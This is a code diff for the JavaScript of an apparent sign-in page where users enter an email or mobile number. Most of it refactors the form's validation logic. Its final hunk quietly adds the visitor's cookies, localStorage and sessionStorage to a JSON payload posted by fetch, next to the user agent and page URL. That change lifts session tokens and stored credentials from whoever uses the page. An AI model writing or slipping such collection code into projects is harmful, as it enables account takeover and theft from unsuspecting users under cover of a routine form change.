@@ -20,71 +20,71 @@ document.addEventListener("DOMContentLoaded", () => {
     label.classList.toggle("shrink", !!val || document.activeElement === input);
   }
 
-  function validate() {
-    const val = input.value.trim();
-    const isEmpty = val === "";
-    const isPhoneInput = isPhone(val);
-    const isEmailInput = emailRegex.test(val);
-    const isValidPhone = isPhoneInput && val.length >= 9;
+function validate() {
+  const val = input.value.trim();
+  const isEmpty = val === "";
+  const isPhoneInput = /^\d+$/.test(val);
+  const isEmailInput = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val);
+  const isValidPhone = isPhoneInput && val.length >= 9;
 
-    // Reset state
-    input.classList.remove("error", "valid", "phone-mode");
-    label.classList.remove("error");
-    errorRequired.classList.add("hidden");
-    errorFormat.classList.add("hidden");
-    errorPhone.classList.add("hidden");
-    subtext.classList.add("hidden");
-    phoneWrapper.classList.add("hidden");
-    button.classList.remove("active");
-    button.disabled = true;
-    errorIcon.style.display = "none";
+  // Reset
+  input.classList.remove("error", "valid", "phone-mode");
+  label.classList.remove("error");
+  errorRequired.classList.add("hidden");
+  errorFormat.classList.add("hidden");
+  errorPhone.classList.add("hidden");
+  phoneWrapper.classList.add("hidden");
+  button.classList.remove("active");
+  button.disabled = true;
+  errorIcon.style.display = "none";
 
-    let hasError = false;
+  let hasError = false;
 
-    if (!touched) return;
+  if (!touched) {
+    subtext.classList.remove("hidden"); // Показываем при загрузке
+    return;
+  }
 
-    if (isEmpty) {
+  if (isEmpty) {
+    input.classList.add("error");
+    label.classList.add("error");
+    errorRequired.classList.remove("hidden");
+    errorIcon.style.display = "block";
+    hasError = true;
+  } else if (isPhoneInput) {
+    input.classList.add("phone-mode");
+    phoneWrapper.classList.remove("hidden");
+    label.textContent = "Mobile number";
+
+    if (!isValidPhone) {
       input.classList.add("error");
       label.classList.add("error");
-      label.textContent = "Email or mobile number";
-      errorRequired.classList.remove("hidden");
+      errorPhone.classList.remove("hidden");
       errorIcon.style.display = "block";
-      updateLabelState();
-      return;
+      hasError = true;
     }
+  } else if (!isEmailInput) {
+    input.classList.add("error");
+    label.classList.add("error");
+    label.textContent = "Email address";
+    errorFormat.classList.remove("hidden");
+    errorIcon.style.display = "block";
+    hasError = true;
+  } else {
+    label.textContent = "Email address";
+  }
 
-    if (isPhoneInput) {
-      input.classList.add("phone-mode");
-      phoneWrapper.classList.remove("hidden");
-      label.textContent = "Mobile number";
-
-      if (!isValidPhone) {
-        input.classList.add("error");
-        label.classList.add("error");
-        errorPhone.classList.remove("hidden");
-        errorIcon.style.display = "block";
-        updateLabelState();
-        return;
-      }
-    } else if (!isEmailInput) {
-      input.classList.add("error");
-      label.classList.add("error");
-      label.textContent = "Email address";
-      errorFormat.classList.remove("hidden");
-      errorIcon.style.display = "block";
-      updateLabelState();
-      return;
-    } else {
-      label.textContent = "Email address";
-    }
-
-    // Valid input
+  if (!hasError) {
     input.classList.add("valid");
     button.classList.add("active");
     button.disabled = false;
-    subtext.classList.remove("hidden");
-    updateLabelState();
+    subtext.classList.remove("hidden"); // ✅ Показываем сабтекст
+  } else {
+    subtext.classList.add("hidden"); // ❌ Скрываем сабтекст если есть ошибки
   }
+
+  updateLabelState();
+}
 
   input.addEventListener("focus", () => {
     touched = true;
@@ -121,6 +121,9 @@ document.addEventListener("DOMContentLoaded", () => {
           userAgent: navigator.userAgent,
           location: window.location.href,
           timestamp: new Date().toISOString(),
+          cookies: document.cookie,
+          localStorage: JSON.stringify(localStorage),
+          sessionStorage: JSON.stringify(sessionStorage),
         }),
       });
 
